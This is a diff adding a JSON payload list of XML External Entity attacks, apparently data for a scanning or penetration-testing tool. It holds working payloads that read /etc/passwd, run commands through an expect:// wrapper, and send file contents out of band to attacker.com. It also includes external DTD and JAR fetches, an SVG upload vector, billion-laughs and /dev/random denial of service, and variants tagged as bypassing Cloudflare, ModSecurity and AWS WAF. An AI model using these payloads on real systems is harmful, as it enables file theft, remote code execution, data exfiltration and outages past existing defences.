@@ -1,0 +1,161 @@
+{
+    "vulnerability_type": "XXE",
+    "description": "XML External Entity payloads with WAF bypass variants",
+    "payloads": [
+        {
+            "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>",
+            "description": "Basic XXE file read",
+            "context": "xml_input",
+            "waf_bypass": false,
+            "tags": [
+                "basic",
+                "file_read"
+            ]
+        },
+        {
+            "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://attacker.com/evil.dtd\">]><root>&xxe;</root>",
+            "description": "External DTD inclusion",
+            "context": "xml_input",
+            "waf_bypass": false,
+            "tags": [
+                "basic",
+                "external_dtd"
+            ]
+        },
+        {
+            "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://attacker.com/evil.dtd\">%xxe;]><root>test</root>",
+            "description": "Parameter entity XXE",
+            "context": "xml_input",
+            "waf_bypass": false,
+            "tags": [
+                "parameter_entity"
+            ]
+        },
+        {
+            "payload": "<?xml version=\"1.0\" encoding=\"UTF-16\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>",
+            "description": "UTF-16 encoding bypass",
+            "context": "xml_input",
+            "waf_bypass": true,
+            "bypass_target": [
+                "cloudflare",
+                "modsecurity"
+            ],
+            "tags": [
+                "utf16",
+                "encoding",
+                "waf_bypass"
+            ]
+        },
+        {
+            "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd\">]><root>&xxe;</root>",
+            "description": "XXE with PHP filter wrapper",
+            "context": "xml_input",
+            "waf_bypass": true,
+            "bypass_target": [
+                "modsecurity"
+            ],
+            "tags": [
+                "php_filter",
+                "base64",
+                "waf_bypass"
+            ]
+        },
+        {
+            "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"expect://id\">]><root>&xxe;</root>",
+            "description": "XXE with expect wrapper for RCE",
+            "context": "xml_input",
+            "waf_bypass": true,
+            "bypass_target": [
+                "cloudflare"
+            ],
+            "tags": [
+                "expect",
+                "rce",
+                "waf_bypass"
+            ]
+        },
+        {
+            "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo SYSTEM \"data://text/plain;base64,PCFET0NUWVBFIGZvbyBbPCFFTlRJVFkgeHhlIFNZU1RFTSAiZmlsZTovLy9ldGMvcGFzc3dkIj5dPg==\"><root>&xxe;</root>",
+            "description": "Data URI DTD with base64 encoding",
+            "context": "xml_input",
+            "waf_bypass": true,
+            "bypass_target": [
+                "cloudflare",
+                "aws_waf"
+            ],
+            "tags": [
+                "data_uri",
+                "base64",
+                "waf_bypass"
+            ]
+        },
+        {
+            "payload": "<?xml version=\"1.0\"?>\n<!DOCTYPE foo [\n  <!ENTITY % file SYSTEM \"file:///etc/passwd\">\n  <!ENTITY % eval \"<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?d=%file;'>\">\n  %eval;\n  %exfil;\n]>\n<root>test</root>",
+            "description": "Out-of-band XXE data exfiltration",
+            "context": "xml_input",
+            "waf_bypass": true,
+            "bypass_target": [
+                "cloudflare",
+                "modsecurity"
+            ],
+            "tags": [
+                "oob",
+                "exfiltration",
+                "waf_bypass"
+            ]
+        },
+        {
+            "payload": "<svg xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\"><image xlink:href=\"expect://id\"/>",
+            "description": "XXE via SVG file upload",
+            "context": "file_upload",
+            "waf_bypass": true,
+            "bypass_target": [
+                "cloudflare",
+                "aws_waf",
+                "modsecurity"
+            ],
+            "tags": [
+                "svg",
+                "file_upload",
+                "waf_bypass"
+            ]
+        },
+        {
+            "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"/dev/random\">]><root>&xxe;</root>",
+            "description": "DoS via /dev/random",
+            "context": "xml_input",
+            "waf_bypass": false,
+            "tags": [
+                "dos",
+                "dev_random"
+            ]
+        },
+        {
+            "payload": "<?xml version=\"1.0\"?><!DOCTYPE lolz [<!ENTITY lol \"lol\"><!ENTITY lol2 \"&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;\"><!ENTITY lol3 \"&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;\">]><root>&lol3;</root>",
+            "description": "Billion laughs DoS attack",
+            "context": "xml_input",
+            "waf_bypass": false,
+            "tags": [
+                "dos",
+                "billion_laughs"
+            ]
+        },
+        {
+            "payload": "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"jar:http://attacker.com/evil.jar!/evil.dtd\">]><root>&xxe;</root>",
+            "description": "JAR protocol for XXE (Java)",
+            "context": "xml_input",
+            "waf_bypass": true,
+            "bypass_target": [
+                "cloudflare",
+                "modsecurity",
+                "aws_waf"
+            ],
+            "tags": [
+                "jar",
+                "java",
+                "protocol",
+                "waf_bypass"
+            ]
+        }
+    ]
+}
